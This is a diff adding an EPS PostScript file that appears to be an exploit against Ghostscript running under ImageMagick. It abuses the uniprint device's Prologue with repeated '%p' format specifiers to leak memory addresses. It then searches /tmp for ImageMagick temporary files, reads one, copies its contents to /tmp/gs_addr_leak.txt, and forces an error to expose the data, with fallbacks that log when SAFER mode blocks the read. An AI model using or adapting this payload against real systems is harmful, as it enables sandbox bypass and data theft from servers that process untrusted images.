@@ -1,0 +1,53 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 100 100
+
+% STEP 1: Write leaked addresses via uniprint format string
+<< /OutputDevice /uniprint
+   /upColorModel /DeviceGray
+   /upWriteComponentCommands <<
+     /Prologue (ADDR_\045p_\045p_\045p_\045p_\045p_\045p_\045p_\045p_END\n)
+   >>
+>> setpagedevice
+0 0 moveto 100 100 lineto stroke
+showpage
+
+% STEP 2: Find the magick output file
+<< /OutputDevice /pngalpha >> setpagedevice
+
+% Search for the output file
+/found_file false def
+/leak_path 256 string def
+(/tmp/magick-*1) {
+  /leak_path exch store
+  /found_file true store
+} 256 string filenameforall
+
+% STEP 3: Try to read it
+found_file {
+  % Try reading the leak file
+  {
+    leak_path (r) file
+    /leak_fd exch def
+    % Read first 1024 bytes
+    /leak_data 1024 string def
+    leak_fd leak_data readstring pop
+    /leak_str exch store
+    leak_fd closefile
+    
+    % Write what we found to a known location
+    (/tmp/gs_addr_leak.txt) (w) file dup
+    leak_str writestring
+    closefile
+    
+    % Put the leak data on the stack so it appears in errors
+    leak_str 1 0 div
+  } stopped {
+    (/tmp/gs_read_failed.txt) (w) file 
+    (read failed - SAFER blocks reading magick files) writestring 
+    closefile
+  } if
+} {
+  (/tmp/gs_no_magick_file.txt) (w) file (no magick file found) writestring closefile
+} ifelse
+
+showpage
